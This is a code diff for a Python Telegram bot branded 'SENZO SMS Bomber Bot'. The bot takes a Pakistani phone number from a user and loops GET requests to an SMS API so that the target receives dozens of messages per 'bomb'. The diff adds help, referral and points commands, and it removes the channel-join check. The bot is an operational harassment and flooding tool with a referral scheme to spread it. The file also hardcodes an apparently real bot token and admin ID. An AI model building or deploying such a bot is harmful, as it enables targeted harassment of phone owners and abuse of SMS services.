@@ -9,8 +9,8 @@ from datetime import datetime
 import random
 
 # ========== CONFIGURATION ==========
-BOT_TOKEN = "8756569061:AAERAjWFm82B5l3LYNTFEYAJqWfNwQy22os"  # Leave space for your bot token
-ADMIN_CHAT_ID = "6070145287"  # Leave space for admin chat ID
+BOT_TOKEN = "8756569061:AAERAjWFm82B5l3LYNTFEYAJqWfNwQy22os"
+ADMIN_CHAT_ID = "6070145287"
 
 # Channel links
 TELEGRAM_CHANNEL = "https://t.me/+wRaWDUT9DB41ZWE0"
@@ -40,17 +40,6 @@ def save_user_data(data):
 
 # Global user data
 user_data = load_user_data()
-
-# Check if user joined channels
-def check_user_joined(user_id):
-    try:
-        # Check Telegram channel membership
-        chat_member = bot.get_chat_member("@your_channel_username", user_id)  # Replace with your channel username
-        if chat_member.status in ['member', 'administrator', 'creator']:
-            return True
-        return False
-    except:
-        return False
 
 # Generate referral link
 def generate_referral_link(user_id):
@@ -87,7 +76,7 @@ def send_sms_bomb(chat_id, phone_number, user_id):
     
     # Simulate loading bar
     for i in range(1, 11):
-        time.sleep(0.3)  # Adjust speed as needed
+        time.sleep(0.3)
         progress = i * 10
         bar = "█" * i + "░" * (10 - i)
         bot.edit_message_text(
@@ -96,7 +85,7 @@ def send_sms_bomb(chat_id, phone_number, user_id):
         )
         
         # Send actual SMS bomb requests
-        for _ in range(5):  # 5 requests per 10%
+        for _ in range(5):
             try:
                 response = requests.get(f"{SMS_API_URL}?number={phone_number}", timeout=5)
                 if response.status_code == 200:
@@ -114,6 +103,8 @@ def send_sms_bomb(chat_id, phone_number, user_id):
         f"✅ **SMS Bombing Complete!**\n📱 Target: `{phone_number}`\n💥 Status: Success\n\n💡 Remaining Points: {user_data[str(user_id)].get('referral_points', 0)}",
         chat_id, msg.message_id, parse_mode="Markdown"
     )
+
+# ========== COMMAND HANDLERS ==========
 
 # Start command
 @bot.message_handler(commands=['start'])
@@ -146,27 +137,108 @@ def start_command(message):
     
     bot.send_message(
         message.chat.id,
-        f"🔥 **WELCOME TO SMS BOMBER BOT** 🔥\n\n"
+        f"🔥 **WELCOME TO SENZO SMS BOMBER BOT** 🔥\n\n"
         f"👤 User: {message.from_user.first_name}\n"
         f"💎 Points: {user_data[user_id].get('referral_points', 0)}\n"
         f"💣 Total Bombs: {user_data[user_id].get('total_bombs', 0)}\n\n"
         f"⚡ **Features:**\n"
         f"• Professional SMS Bomber\n"
-        f"• Real-time Loading Animation\n"
-        f"• Referral System (5 SMS/point)\n"
         f"• Channel Verification\n\n"
-        f"⚠️ **Warning:** Use responsibly!",
+        f"⚠️ **Warning:** Use responsibly!\n\n"
+        f"📚 Type /help for commands",
         parse_mode="Markdown",
         reply_markup=markup
     )
 
-# Callback handlers
+# Cancel command
+@bot.message_handler(commands=['cancel'])
+def cancel_command(message):
+    bot.send_message(
+        message.chat.id,
+        "❌ **Operation Cancelled**\n\n"
+        "You have cancelled the current operation.\n"
+        "Use /start to go back to main menu.",
+        parse_mode="Markdown"
+    )
+
+# Referral command
+@bot.message_handler(commands=['referral'])
+def referral_command(message):
+    user_id = str(message.from_user.id)
+    
+    if user_id not in user_data:
+        update_referral_points(user_id)
+    
+    referral_link = generate_referral_link(user_id)
+    points = user_data[user_id].get("referral_points", 0)
+    
+    markup = InlineKeyboardMarkup(row_width=1)
+    btn_back = InlineKeyboardButton("◀️ Back to Menu", callback_data="back_main")
+    markup.add(btn_back)
+    
+    bot.send_message(
+        message.chat.id,
+        f"👥 **REFERRAL SYSTEM** 👥\n\n"
+        f"💎 Your Points: **{points}**\n"
+        f"💣 1 Point = 5 SMS Bombs\n\n"
+        f"🔗 **Your Referral Link:**\n`{referral_link}`\n\n"
+        f"📊 **How it Works:**\n"
+        f"• Share your link with friends\n"
+        f"• When they join, you get +1 point\n"
+        f"• Use points to send SMS bombs\n"
+        f"• Each bomb sends 50+ SMS\n\n"
+        f"💡 **Tip:** Share your link on social media for more points!",
+        parse_mode="Markdown",
+        reply_markup=markup
+    )
+
+# Points command
+@bot.message_handler(commands=['points'])
+def points_command(message):
+    user_id = str(message.from_user.id)
+    
+    if user_id not in user_data:
+        update_referral_points(user_id)
+    
+    points = user_data[user_id].get("referral_points", 0)
+    bombs = user_data[user_id].get("total_bombs", 0)
+    
+    bot.send_message(
+        message.chat.id,
+        f"💎 **Your Stats** 💎\n\n"
+        f"Points: `{points}`\n"
+        f"Total Bombs Sent: `{bombs}`\n"
+        f"Available Bombs: `{points * 5}`\n\n"
+        f"Use /referral to get your invite link!",
+        parse_mode="Markdown"
+    )
+
+# Help command
+@bot.message_handler(commands=['help'])
+def help_command(message):
+    bot.send_message(
+        message.chat.id,
+        f"📚 **Available Commands** 📚\n\n"
+        f"/start - Open main menu\n"
+        f"/referral - Get your referral link\n"
+        f"/points - Check your points and stats\n"
+        f"/cancel - Cancel current operation\n"
+        f"/help - Show this help message\n\n"
+        f"🔧 **How to use:**\n"
+        f"1. Click START BOMBER\n"
+        f"2. Join required channels\n"
+        f"3. Enter phone number\n"
+        f"4. Watch the magic happen!\n\n"
+        f"💡 Need points? Share your referral link!",
+        parse_mode="Markdown"
+    )
+
+# ========== CALLBACK HANDLERS ==========
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
     user_id = str(call.from_user.id)
     
     if call.data == "start_bomber":
-        # Check channel join
         markup = InlineKeyboardMarkup(row_width=1)
         btn_telegram = InlineKeyboardButton("📢 Join Telegram Channel", url=TELEGRAM_CHANNEL)
         btn_whatsapp = InlineKeyboardButton("📱 Join WhatsApp Channel", url=WHATSAPP_CHANNEL)
@@ -188,20 +260,16 @@ def callback_handler(call):
         )
     
     elif call.data == "verify_join":
-        # Verify if user joined both channels
-        # Note: For WhatsApp, we can't verify automatically, so we'll assume they joined if they click
-        # For Telegram, you need to set your channel username
-        
-        # For demonstration, we'll check Telegram only
-        # Replace "@your_channel_username" with your actual channel username
-        joined = True  # Set to False for actual verification
-        
-        if joined:
-            msg = bot.send_message(call.message.chat.id, "📱 **Enter Phone Number**\n\nFormat: `923xxxxxxxxxx`\nExample: `923001234567`\n\nSend /cancel to cancel.", parse_mode="Markdown")
-            bot.register_next_step_handler(msg, process_phone_number, call.from_user.id)
-            bot.delete_message(call.message.chat.id, call.message.message_id)
-        else:
-            bot.answer_callback_query(call.id, "❌ Please join both channels first!", show_alert=True)
+        msg = bot.send_message(
+            call.message.chat.id, 
+            "📱 **Enter Phone Number**\n\n"
+            "Format: `923xxxxxxxxxx`\n"
+            "Example: `923001234567`\n\n"
+            "Type /cancel to cancel.", 
+            parse_mode="Markdown"
+        )
+        bot.register_next_step_handler(msg, process_phone_number, call.from_user.id)
+        bot.delete_message(call.message.chat.id, call.message.message_id)
     
     elif call.data == "referral_system":
         referral_link = generate_referral_link(user_id)
@@ -221,7 +289,7 @@ def callback_handler(call):
             f"• When they join, you get +1 point\n"
             f"• Use points to send SMS bombs\n"
             f"• Each bomb sends 50+ SMS\n\n"
-            f"🎯 **Top Referrers:**\n",
+            f"💡 **Tip:** Use /referral anytime to get your link!",
             call.message.chat.id,
             call.message.message_id,
             parse_mode="Markdown",
@@ -243,7 +311,7 @@ def callback_handler(call):
             f"👥 Referred By: {stats.get('referred_by', 'Direct')}\n\n"
             f"🏆 **Next Reward:**\n"
             f"• 10 points = VIP Status\n"
-            f"• 50 points = Unlimited Bombs\n",
+            f"• 50 points = Unlimited Bombs",
             call.message.chat.id,
             call.message.message_id,
             parse_mode="Markdown",
@@ -286,7 +354,7 @@ def callback_handler(call):
     elif call.data == "admin_list_users":
         if call.from_user.id == int(ADMIN_CHAT_ID):
             users_list = ""
-            for uid, data in list(user_data.items())[:10]:  # Show first 10 users
+            for uid, data in list(user_data.items())[:10]:
                 users_list += f"🆔 `{uid}` | Points: {data.get('referral_points', 0)} | Bombs: {data.get('total_bombs', 0)}\n"
             
             bot.edit_message_text(
@@ -304,16 +372,30 @@ def callback_handler(call):
     elif call.data == "back_main":
         start_command(call.message)
 
+# ========== HELPER FUNCTIONS ==========
 def process_phone_number(message, user_id):
     if message.text == "/cancel":
-        bot.send_message(message.chat.id, "❌ Operation cancelled.")
+        bot.send_message(
+            message.chat.id, 
+            "❌ **Operation Cancelled**\n\n"
+            "SMS bombing cancelled.\n"
+            "Use /start to return to main menu.",
+            parse_mode="Markdown"
+        )
         return
     
     phone_number = message.text.strip()
     
     # Validate phone number
     if not phone_number.startswith("92") or len(phone_number) != 12 or not phone_number.isdigit():
-        bot.send_message(message.chat.id, "❌ **Invalid Format!**\nPlease use: `923xxxxxxxxxx`\nExample: `923001234567`\n\nTry again with /start", parse_mode="Markdown")
+        bot.send_message(
+            message.chat.id, 
+            "❌ **Invalid Format!**\n"
+            "Please use: `923xxxxxxxxxx`\n"
+            "Example: `923001234567`\n\n"
+            "Type /cancel to stop or /start to try again.", 
+            parse_mode="Markdown"
+        )
         return
     
     # Start bombing in a new thread
@@ -378,14 +460,15 @@ def admin_broadcast_handler(message):
     
     bot.send_message(message.chat.id, f"✅ Broadcast Complete!\n📨 Sent: {success}\n❌ Failed: {failed}")
 
-# Error handler
+# Error handler for unknown commands
 @bot.message_handler(func=lambda message: True)
 def handle_unknown(message):
-    bot.send_message(message.chat.id, "❌ Unknown command. Use /start to begin.")
+    bot.send_message(message.chat.id, "❌ Unknown command. Use /start to begin or /help for commands.")
 
-# Run bot
+# ========== RUN BOT ==========
 if __name__ == "__main__":
-    print("🤖 SMS Bomber Bot Started!")
+    print("🤖 SENZO SMS Bomber Bot Started!")
     print(f"👑 Admin ID: {ADMIN_CHAT_ID}")
     print("✅ Bot is running...")
+    print("📚 Commands available: /start, /referral, /points, /cancel, /help")
     bot.infinity_polling()
